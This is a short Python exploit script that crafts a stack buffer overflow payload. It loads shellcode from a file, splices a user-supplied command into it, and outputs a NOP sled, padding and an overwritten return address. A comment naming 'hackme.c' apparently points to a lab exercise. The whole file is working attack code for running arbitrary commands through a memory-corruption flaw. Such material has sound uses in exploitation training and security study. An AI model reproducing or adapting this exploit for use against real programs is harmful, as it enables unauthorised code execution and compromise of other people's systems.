#! /usr/bin/python3
import os
import sys

if len(sys.argv) == 4:
    address = bytes.fromhex(sys.argv[1])[::-1] #reverse for little-endian (Stack)
    shellcodeFile = sys.argv[2]
    command = sys.argv[3]
else:
    print("Usage:", sys.argv[0], "return_address(&buffer) shellcode_filename command")
    sys.exit(1)

f = open(shellcodeFile, "rb")
shellcode = bytearray(f.read())
f.close()

commandOffset = shellcode.index("REPLACE_ME".encode("ascii"))
sizeOffset = commandOffset - 1

commandBytes = command.encode("ascii")
shellcode = shellcode.replace("REPLACE_ME".encode("ascii"), commandBytes + b"\x0a")
shellcode[sizeOffset] = len(commandBytes).to_bytes()[0]

bufferSize = 200 # hackme.c

nopSled = b"\x90" * 16 # NOP instruction in x86

paddingSize = 16 # RBP and return address
padding = b"A" * (bufferSize - len(nopSled) - len(shellcode) + paddingSize)

# Write to stdout
os.write(1, nopSled + shellcode + padding + address)
